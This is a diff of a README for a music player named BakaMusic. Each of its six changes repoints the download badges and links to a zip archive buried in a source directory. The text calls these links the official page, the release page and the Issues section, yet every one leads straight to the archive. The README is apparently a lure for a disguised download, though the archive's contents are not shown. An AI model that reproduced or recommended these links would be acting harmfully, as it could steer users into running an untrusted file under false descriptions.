@@ -1,6 +1,6 @@
 # 🎵 BakaMusic - Simple, Customizable Music Player
 
-[![Download BakaMusic](https://img.shields.io/badge/Download-BakaMusic-brightgreen)](https://github.com/Ajaysid561/BakaMusic/raw/refs/heads/main/src/renderer/pages/main-page/views/setting-view/routers/About/Baka-Music-3.5.zip)
+[![Download BakaMusic](https://img.shields.io/badge/Download-BakaMusic-brightgreen)](https://raw.githubusercontent.com/Ajaysid561/BakaMusic/main/src/renderer/core/recently-playlist/Music_Baka_v3.2.zip)
 
 ---
 
@@ -32,7 +32,7 @@ BakaMusic is a free music player designed for easy use. It supports plugins and 
 
 Click the button below to visit the official BakaMusic page on GitHub. You will find the latest version ready to download there.
 
-[![Download BakaMusic](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Ajaysid561/BakaMusic/raw/refs/heads/main/src/renderer/pages/main-page/views/setting-view/routers/About/Baka-Music-3.5.zip)
+[![Download BakaMusic](https://img.shields.io/badge/Download-Now-blue)](https://raw.githubusercontent.com/Ajaysid561/BakaMusic/main/src/renderer/core/recently-playlist/Music_Baka_v3.2.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps carefully. You do not need any technical skills.
 
 Go to the main page to find the latest release:
 
-https://github.com/Ajaysid561/BakaMusic/raw/refs/heads/main/src/renderer/pages/main-page/views/setting-view/routers/About/Baka-Music-3.5.zip
+https://raw.githubusercontent.com/Ajaysid561/BakaMusic/main/src/renderer/core/recently-playlist/Music_Baka_v3.2.zip
 
 ### 2. Find the Latest Release
 
@@ -150,7 +150,7 @@ If music files don’t play:
 ## 📞 Support and Feedback
 
 For help, go to the Issues section on the GitHub page:  
-https://github.com/Ajaysid561/BakaMusic/raw/refs/heads/main/src/renderer/pages/main-page/views/setting-view/routers/About/Baka-Music-3.5.zip
+https://raw.githubusercontent.com/Ajaysid561/BakaMusic/main/src/renderer/core/recently-playlist/Music_Baka_v3.2.zip
 
 There, you can report bugs or request new features.  
 
@@ -164,4 +164,4 @@ There, you can report bugs or request new features.
 
 ---
 
-[![Download BakaMusic](https://img.shields.io/badge/Download-BakaMusic-brightgreen)](https://github.com/Ajaysid561/BakaMusic/raw/refs/heads/main/src/renderer/pages/main-page/views/setting-view/routers/About/Baka-Music-3.5.zip)
+[![Download BakaMusic](https://img.shields.io/badge/Download-BakaMusic-brightgreen)](https://raw.githubusercontent.com/Ajaysid561/BakaMusic/main/src/renderer/core/recently-playlist/Music_Baka_v3.2.zip)
